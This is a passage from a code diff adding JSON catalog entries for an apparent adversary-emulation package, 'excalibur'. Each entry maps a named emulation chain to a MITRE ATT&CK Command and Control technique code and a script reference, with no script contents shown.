+      "package": "excalibur",
+      "tcode": "T1008",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1008-Fallback Channels"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1090.001-Internal Proxy",
+      "description": "Emulation chain for T1090.001: Internal Proxy.",
+      "package": "excalibur",
+      "tcode": "T1090.001",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1090.001-Internal Proxy"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1102.001-Dead Drop Resolver",
+      "description": "Emulation chain for T1102.001: Dead Drop Resolver.",
+      "package": "excalibur",
+      "tcode": "T1102.001",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1102.001-Dead Drop Resolver"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1001.001-Junk Data",
+      "description": "Emulation chain for T1001.001: Junk Data.",
+      "package": "excalibur",
+      "tcode": "T1001.001",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1001.001-Junk Data"
       ]
     }
   ]
